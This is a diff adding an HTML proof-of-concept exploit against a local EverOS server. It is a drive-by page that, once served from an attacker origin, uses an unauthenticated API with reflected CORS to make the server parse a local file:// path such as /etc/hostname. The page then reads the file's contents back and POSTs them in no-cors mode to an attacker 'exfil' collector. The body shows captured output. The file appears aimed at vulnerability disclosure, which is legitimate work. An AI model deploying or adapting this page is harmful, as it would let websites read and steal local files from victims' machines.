@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<title>EverOS drive-by local file read PoC</title>
+<!--
+  Serve from any http(s) origin the victim visits, e.g.:
+      python3 -m http.server 8000
+      http://attacker.test:8000/driveby.html?file=file:///etc/hostname
+  Requires the EverOS server to be running locally with [multimodal] configured
+  (parser enabled). The add request needs no auth; CORS reflects this origin.
+  Exfil POST is mode:no-cors so the collector needs no CORS headers.
+-->
+<script>
+const API     = "http://127.0.0.1:18777";        // victim's local EverOS
+const COLLECT = "http://127.0.0.1:8899/exfil";   // attacker collector
+const target  = new URLSearchParams(location.search).get("file") || "file:///etc/hostname";
+const session = "driveby-" + Math.random().toString(36).slice(2);
+
+async function post(path, body) {
+  const r = await fetch(API + path, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(body)
+  });
+  return r.json();
+}
+
+(async () => {
+  try {
+    await post("/api/v2/memory/add", {
+      session_id: session,
+      messages: [{
+        sender_id: "u1", role: "user", timestamp: Date.now(),
+        content: [{type: "doc", name: "x.txt", uri: target, ext: "txt"}]
+      }],
+      defer_extraction: true
+    });
+    const out = await post("/api/v2/memory/search", {
+      user_id: "attacker", query: "x", method: "keyword",
+      filters: {session_id: session}
+    });
+    const parsed = (out?.data?.unprocessed_messages?.[0]?.content?.[0]?.parsed_content) ?? null;
+    await fetch(COLLECT, {
+      method: "POST", mode: "no-cors",
+      body: JSON.stringify({target, session, parsed, raw: out})
+    });
+    document.body.textContent = JSON.stringify({target, parsed}, null, 2);
+  } catch (e) {
+    document.body.textContent = "ERR " + e;
+  }
+})();
+</script>
+</head><body>{
+  "target": "file:///etc/hostname",
+  "parsed": "teycir-G5-KF5\n"
+}</body></html>
